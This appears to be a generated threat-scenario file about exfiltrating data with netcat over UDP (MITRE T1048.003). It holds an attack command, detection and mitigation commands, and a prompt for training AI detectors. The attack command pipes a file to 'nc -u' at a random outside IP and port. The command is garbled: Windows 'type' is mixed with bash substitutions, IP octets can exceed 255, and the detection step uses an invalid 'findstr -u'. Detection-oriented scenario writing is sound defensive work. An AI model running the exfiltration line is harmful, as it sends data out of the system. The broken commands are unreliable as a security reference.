---
type: campaign
scenario_id: 196
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using netcat to exfiltrate data over UDP.

## Threat Description
Using netcat to exfiltrate data over UDP.

## Attack Command
```
type C:\$(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) | nc -u $(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3) $(shuf -i 1000-65535 -n 1)
```

## Detection Logic
Monitor netcat: `wmic process where name='nc.exe' get commandline | findstr -u`; Monitor UDP traffic: `netstat -anp | grep UDP`.

## Mitigation
Restrict netcat: `icacls %programfiles%\Netcat\nc.exe /deny Everyone:RX`; Block UDP outbound: `netsh advfirewall firewall add rule name='Block UDP' dir=out action=block protocol=UDP`.

## AI Training Prompt
Train AI to detect netcat UDP exfiltration and suggest UDP restrictions.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
